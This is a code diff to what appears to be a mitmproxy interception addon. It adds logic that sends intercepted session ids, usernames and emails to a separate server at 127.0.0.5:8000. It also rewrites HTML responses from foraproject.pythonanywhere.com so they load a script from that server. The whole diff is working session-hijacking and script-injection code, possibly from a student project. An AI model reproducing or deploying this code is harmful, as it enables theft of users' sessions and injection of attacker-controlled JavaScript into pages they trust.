@@ -17,6 +17,7 @@ class login:
     
     username=""
     email=""
+    filename=""
     def load(self,loader):
         ctx.options.http2 = False
 
@@ -43,10 +44,16 @@ class login:
         print("\n",id)
         if id!="" and flow.request.path in restricted_list:
             requests.post("http://127.0.0.5:8000/login",json ={"username":self.username,"session":id,"email":self.email})
-            # print(r.text)
-        # console.log(flow.request.headers)
+            res = requests.post("http://127.0.0.5:8000/sendfile",json = {"session":id})
+            # data = res.json()
+            # print("the body os the response is",res.text)
+            data = json.loads(json.loads(res.text))
+            # print("the data is the response is",type(data))
+            self.filename = data["filename"]
+        
         if flow.request.headers.get('Host')=="foraproject.pythonanywhere.com" and flow.response.headers.get('Content-Type') == 'text/html; charset=utf-8' and flow.request.path not in restricted_list :
-            flow.response.text = flow.response.text.replace('</head>','<script src = "https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script><script src="http://127.0.0.5:8000/path.js"></script></head>')
+            replaceString = '<script src = "https://code.jquery.com/jquery-3.4.1.min.js"></script><script src="http://127.0.0.5:8000/{file}"></script></head>'.format(file=self.filename)
+            flow.response.text = flow.response.text.replace('</head>',replaceString)
 
 ###
 # 0. check if user has session already.
